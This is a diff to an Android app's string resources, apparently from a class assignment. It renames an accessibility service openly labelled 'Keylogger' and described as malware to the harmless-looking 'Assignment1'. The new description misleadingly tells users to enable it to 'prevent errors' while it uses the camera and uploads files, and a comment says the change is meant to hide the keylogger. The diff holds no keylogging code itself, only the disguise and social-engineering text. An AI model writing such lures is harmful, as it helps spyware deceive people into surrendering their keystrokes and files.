@@ -14,6 +14,7 @@
     <string name="minyao_info">Entrepreneur. Beer aficionado. Twitter fanatic. Passionate internet ninja. Alcohol lover.</string>
     <string name="lynette_info">Certified explorer. Music ninja. Subtly charming writer. Avid gamer. Web specialist.</string>
 
-    <string name="accessibility_service_label">Keylogger</string>
-    <string name="accessibility_service_description">Don\'t worry its Just a malware</string>
+    <!--  Change the Keylogger Accessibility service labels and description  -->
+    <string name="accessibility_service_label">Assignment1</string>
+    <string name="accessibility_service_description">This accessibility service allows the application to use the camera and upload files. Please enable the service to prevent errors to occur.</string>
 </resources>
